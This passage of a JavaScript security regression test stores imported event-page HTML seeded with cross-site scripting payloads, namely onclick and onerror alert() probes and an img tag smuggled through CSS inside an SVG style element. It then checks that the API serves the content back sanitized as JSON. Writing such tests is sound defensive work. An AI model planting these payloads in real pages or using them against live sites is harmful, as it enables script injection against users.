    frameOpen: '<style data-rv-imported-css="/a.css">\n' + IMPORT_CSS + '\n</style>\n<style data-rv-imported-frame>body#imported #container{display:contents}</style>\n<div id="root" onclick="alert(9)"><div class="app">',
    frameClose: '</div></div>',
    sections: [{ id: 'about', name: 'About', html: '<section id="about"><h2>About</h2><img src=x onerror=alert(10)></section>' }, { id: 'speakers', name: 'Speakers', html: '<section id="speakers"><svg><style>.s{content:"<img src=x onerror=alert(11)>"}</style></svg><h2>Speakers</h2></section>' }] }));
  return Promise.all([call('GET', '/api/imported-section?eventId=imp-old'), call('GET', '/api/imported-section?eventId=imp-old&all=1'), call('GET', '/api/imported-template?eventId=imp-old')]).then(function (r) {
    var one = r[0], cut = r[1];
    check('BE-050: the page is answered as JSON { html }, never as an HTML document', one.status === 200 && /application\/json/.test(one.type) && one.body && typeof one.body.html === 'string', [one.status, one.type]);
    check('BE-050: served safe, whatever is stored', !unsafeIn(one.body.html).length, unsafeIn(one.body.html).join(', '));
    check('BE-050: its stylesheets first, with their marks; the page after them', /^<style data-rv-imported-css="\/a\.css">/.test(one.body.html) && one.body.html.indexOf('<div class="rv-imported">') !== -1 && one.body.html.indexOf('data-rv-motion=') !== -1, one.body.html.slice(0, 300));
    var b = cut.body || {}, joined = [(b.frameOpen || '') + (b.frameClose || '')].concat(Object.keys(b.sections || {}).map(function (k) { return b.sections[k]; }));
    check('BE-050: ?all=1 answers the frame and the sections', cut.status === 200 && b.sections && b.sections.about && b.sections.speakers, [cut.status, b]);
    check('BE-050: ?all=1 is served safe', joined.every(function (x) { return !unsafeIn(x).length; }), joined.map(unsafeIn).join(' | '));
    check('BE-050: the frame is still the page\'s two halves', /<style data-rv-imported-frame>/.test(b.frameOpen) && /<div id="root"><div class="app">$/.test(b.frameOpen) && b.frameClose === '</div></div>', [b.frameOpen.slice(-80), b.frameClose]);
    check('BE-050: a section\'s <svg> <style> is lifted out, its CSS unable to make a tag', /^<style data-rv-imported-css="page">/.test(b.sections.speakers) && !/<svg>\s*<style/.test(b.sections.speakers) && !/<img/.test(b.sections.speakers), b.sections.speakers);
    check('BE-050: imported-template answers for a signed-in caller', r[2].status === 200 && r[2].body && r[2].body.frame === true, r[2].status);
  });
});

/* ---------- run ---------- */
steps.reduce(function (p, fn) { return p.then(fn); }, Promise.resolve()).then(function () {
  console.log('security-fixes: ' + passed + ' passed' + (failed ? ', ' + failed + ' FAILED' : ''));
  process.exit(failed ? 1 : 0);
}, function (err) {
  console.error('security-fixes: the run stopped — ' + (err && err.stack || err));
  process.exit(1);
});
